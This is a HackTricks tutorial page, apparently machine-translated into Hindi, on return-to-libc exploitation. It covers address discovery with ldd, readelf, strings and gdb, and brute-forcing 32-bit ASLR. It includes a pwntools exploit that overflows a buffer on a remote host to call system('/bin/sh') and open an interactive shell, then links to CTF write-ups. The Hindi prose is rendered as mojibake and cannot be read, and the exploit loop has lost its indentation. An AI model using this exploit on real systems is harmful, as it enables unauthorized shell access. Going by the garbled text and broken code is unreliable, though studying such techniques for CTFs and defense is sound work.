# Ret2lib

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рд╣рдореЗрдВ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## **рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА**

**Ret2Libc** рдХрд╛ рд╕рд╛рд░ рд╣реИ рдХрд┐рд╕реА рднреА рд╡рдВрд╢рд╛рд╡рд▓реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХреЛ рдХрд┐рд╕реА рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдлрд╝рдВрдХреНрд╢рди (рдЬреИрд╕реЗ **system**, **execve**, **strcpy**) рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ рднрдВрдЧ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп рд╣рдорд▓рд╛рд╡рддрд╛рд░рд┐рдд рд╢реИрд▓рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдпред рд╣рдорд▓рд╛рд╡рддрд╛ рдПрдХ рдкреЗрд▓реЛрдб рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рд╕реНрдЯреИрдХ рдкрд░ рд╡рд╛рдкрд╕реА рдкрддрд╛ рд╕рд╣реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рдХреЙрд▓рд┐рдВрдЧ рдХрдиреНрд╡реЗрдВрд╢рди рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЖрд╡рд╢реНрдпрдХ рддрд░реАрдХреЗ рд╕реЗ рдХрд┐рд╕реА рднреА рдЖрд╡рд╢реНрдпрдХ рддрд░реНрдХреЛрдВ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рд╡реНрдпрд╡рд╕реНрдерд┐рдд рдХрд░рддрд╛ рд╣реИред

### **рдЙрджрд╛рд╣рд░рдг рдХрджрдо (рд╕рд░рд▓реАрдХреГрдд)**

* рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рдВрдХреНрд╢рди (рдЬреИрд╕реЗ рд╕рд┐рд╕реНрдЯрдо) рдФрд░ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб (рдЬреИрд╕реЗ /bin/sh) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ
* рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ рдЬреЛ рдХрдорд╛рдВрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкрд░ рдкрд╣рд▓рд╛ рддрд░реНрдХ рджрд┐рдЦрд╛рдиреЗ рдФрд░ рдХрд╛рд░реНрдпрдирд┐рд░реНрд╡рд╛рд╣реА рдзрд╛рд░рд╛ рдХреЛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрд╛рд╕ рд▓реЗ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛред

## рдкрддреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

* рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ `libc` рдЬреЛ рд╡рд░реНрддрдорд╛рди рдорд╢реАрди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡рд╣ рдпрд╣рд╛рдБ рдореЗрдореЛрд░реА рдореЗрдВ рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛрдЧрд╛ рдЗрд╕реЗ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

рдпрджрд┐ рдЖрдк рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ ASLR libc рдХреЗ рдкрддреЗ рдХреЛ рдмрджрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* рдЬрд╛рдирддреЗ рд╣реБрдП рдХрд┐ рдХреМрди рд╕реА libc рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, `system` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдСрдлрд╕реЗрдЯ рдвреВрдВрдврдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* рдЬрд╛рдирддреЗ рд╣реБрдП рдЬрд┐рд╕ libc рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЙрд╕рд╕реЗ `/bin/sh` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдСрдлрд╕реЗрдЯ рдвреВрдВрдврдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### рдЬреАрдбреАрдмреА-рдкреАрдбрд╛ / рдЬреАрдИрдПрдл рдХрд╛ рдЙрдкрдпреЛрдЧ

рд▓рд┐рдмрд╕реА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рдмрд╛рдж, **system** рдлрд╝рдВрдХреНрд╢рди, **exit** рдлрд╝рдВрдХреНрд╢рди рдФрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ **`/bin/sh`** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП Peda рдпрд╛ GEF рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps рдХрд╛ рдЙрдкрдпреЛрдЧ

рдпрджрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдмрд╛рдд рдХрд░рддреЗ рд╣реИрдВ (рдиреЗрдЯрд╡рд░реНрдХ рд╕рд░реНрд╡рд░) рддреЛ **рдмрдЪреНрдЪреЗ** рдмрдирд╛ рд░рд╣реА рд╣реИ, рддреЛ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдкрдврд╝рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЖрдкрдХреЛ рд░реВрдЯ рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

рдпрд╣рд╛рдБ рдЖрдк **рд╕рдЯреАрдХ рд░реВрдк рд╕реЗ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ libc рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ** рдФрд░ **рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмрдЪреНрдЪреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ**ред

![](<../../../.gitbook/assets/image (850).png>)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ **0xb75dc000** рдореЗрдВ рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдпрд╣ libc рдХрд╛ рдЖрдзрд╛рд░ рдкрддрд╛ рд╣реЛрдЧрд╛)

## рдЕрдЬреНрдЮрд╛рдд libc

рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ **рдкрддрд╛ рдирд╣реАрдВ рд╣реЛ рдХрд┐ рдмрд╛рдЗрдирд░реА рдХреМрди рд╕рд╛ libc рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИ** (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рд╕рд░реНрд╡рд░ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХрд╛ рдХреЛрдИ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИ)ред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рд╡рд┐рдХрд▓реНрдк рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдХреБрдЫ рдкрддреЗ рдЪреБрд░рд╛рдиреЗ рдФрд░ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреМрди рд╕рд╛ libc** рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

рдФрд░ рдЖрдк рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ pwntools рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 рдСрдлрд╕реЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде libc рдХреЛ рдЬрд╛рдиреЗрдВ

рдкреГрд╖реНрда [https://libc.blukat.me/](https://libc.blukat.me/) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ libc рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрд╕реНрдХрд░рдг** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдПред

## 32 рдмрд┐рдЯ рдореЗрдВ ASLR рдХреЛ рджрд╛рдЦрд┐рд▓ рдХрд░рдирд╛

рдпреЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ рд╣рдорд▓реЗ **рдХреЗрд╡рд▓ 32 рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА** рд╣реИрдВред

* рдпрджрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╕реНрдерд╛рдиреАрдп рд╣реИ, рддреЛ рдЖрдк libc рдХрд╛ рдЖрдзрд╛рд░ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (32 рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* рдЕрдЧрд░ рдЖрдк рдПрдХ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк `libc` рдлрд╝рдВрдХреНрд╢рди `usleep` рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, 10 рдХреЛ рдПрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдПред рдпрджрд┐ рдХрд┐рд╕реА рд╕рдордп рд╕рд░реНрд╡рд░ **10 рд╕реЗрдХрдВрдб рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдордп рд▓реЗрддрд╛ рд╣реИ** рддреЛ рдЖрдкрдиреЗ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд▓рд┐рдпрд╛ рд╣реИред

## рд╡рди рдЧреИрдЬреЗрдЯ

рдПрдХ рд╢реИрд▓ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрддреЗ рдкрд░ рдЬрд╛рдХрд░ рд╢реИрд▓ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗрдВ libc рдореЗрдВ:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ ASLR рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХреЛрдб рдореЗрдВ рдПрдХреАрдХреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╡рдВрд╢рд╛рд╡рд▓реА рдмрд╛рдЗрдирд░реА рдПрдХ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Ret-into-printf (рдпрд╛ puts)

рдЗрд╕рд╕реЗ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕реЗ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рддрд░рд╣ рдХреЗ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд░рдЦрдХрд░ `printf`/`puts` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## Ret2printf

рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдПрдХ **Ret2lib рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕реЗ `printf` рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рджреБрд░реНрдмрд▓рддрд╛ рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХреЗ** рдЬрд┐рд╕реЗ `ret2lib` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдЙрд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `printf` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдпрд╣ рдмреЗрдХрд╛рд░ рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╕рдВрднрд╡ рд╣реИ):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдХрд╛ рд▓реАрдХ рджреЗрддреЗ рд╣реБрдП, рдПрдХ рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд╣реИ рд▓реЗрдХрд┐рди PIE рдирд╣реАрдВ, рдкрд╣рд▓рд╛ рдХрджрдо рд╣реИ рдХреИрдирд╛рд░реА рдХреЗ 0x00 рдмрд╛рдЗрдЯ рддрдХ рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рднрд░рдирд╛ рдФрд░ рдлрд┐рд░ puts рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдФрд░ рдЗрд╕реЗ рд▓реАрдХ рдХрд░рдирд╛ред рдХреИрдирд╛рд░реА рдХреЗ рд╕рд╛рде рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо, рдХреИрдирд╛рд░реА рдирд╣реАрдВ, рдореБрдЦреНрдп рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ рд╕реЗ рдПрдХ рдмрдЪреНрдЪреЗ рдХрд╛рд░реНрдп рд╕реЗред puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯ рдФрд░ рдлрд┐рд░ рдПрдХ рд╡рди рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП puts рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯред
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 рдмрд┐рдЯ, рдХреЛрдИ pie рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдирд╛рд░реА рдирд╣реАрдВ, рдХреЛрдИ relro рдирд╣реАрдВ, nxред рд▓реАрдХ (libc) рдХреЗ рдкрддреЗ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓реЗрдЦрди рдХрд╛рд░реНрдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* рд╕реНрдЯреИрдХ рд╕реЗ рдХреИрдирд╛рд░реА рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдпрд╣ GOT рдореЗрдВ рд╣реИ) рдХрд╛ рдкрддрд╛ `/bin/sh` рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рдеред
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 рдмрд┐рдЯ, рдХреЛрдИ relro рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдирд╛рд░реА рдирд╣реАрдВ, nx, pieред рд╕реНрдЯреИрдХ рд╕реЗ libc рдФрд░ рд╣реАрдк рдХреЗ рдкрддреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмреБрд░рд╛ рдЗрдВрдбреЗрдХреНрд╕рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред `system('/bin/sh')` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ret2lib рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (рд╣реАрдк рдкрддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдПрдХ рдЬрд╛рдБрдЪ рдХреЛ рдЙрдордХрд░рдиреЗ рдХреЗ рд▓рд┐рдП)ред
